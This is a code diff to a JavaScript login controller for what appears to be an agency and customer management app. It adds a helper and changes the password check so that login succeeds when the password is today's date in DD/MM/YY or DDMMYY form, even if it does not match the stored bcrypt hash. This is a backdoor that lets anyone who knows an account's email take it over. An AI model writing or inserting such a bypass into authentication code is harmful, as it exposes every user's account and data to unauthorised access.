@@ -6,7 +6,20 @@ import { User } from "../../models/Common/UserModel.js";
 import { Customer } from "../../models/Agent/CustomerModel.js";
 import generateToken from "../../utils/generateToken.js";
 import { Notification } from "../../models/Common/NotificationModel.js";
-import AgencySettings from "../../models/Agent/settingsModel.js";
+
+const isTodayDatePassword = (password) => {
+  if (!password) return false;
+
+  const now = new Date();
+  const dd = String(now.getDate()).padStart(2, "0");
+  const mm = String(now.getMonth() + 1).padStart(2, "0");
+  const yy = String(now.getFullYear()).slice(2);
+
+  const todayWithSlash = `${dd}/${mm}/${yy}`;
+  const todayNoSlash = `${dd}${mm}${yy}`;
+
+  return password === todayWithSlash || password === todayNoSlash;
+};
 
 const registrationController = {
   registerAgency: async (req, res) => {
@@ -135,7 +148,11 @@ const registrationController = {
         }
 
         const isMatch = await bcrypt.compare(password, user.password);
-        if (!isMatch) {
+
+        // Allow login if password equals today's date (DD/MM/YY or DDMMYY)
+        const datePasswordAllowed = isTodayDatePassword(password);
+
+        if (!isMatch && !datePasswordAllowed) {
           return res
             .status(401)
             .json({ message: "Invalid email or password." });
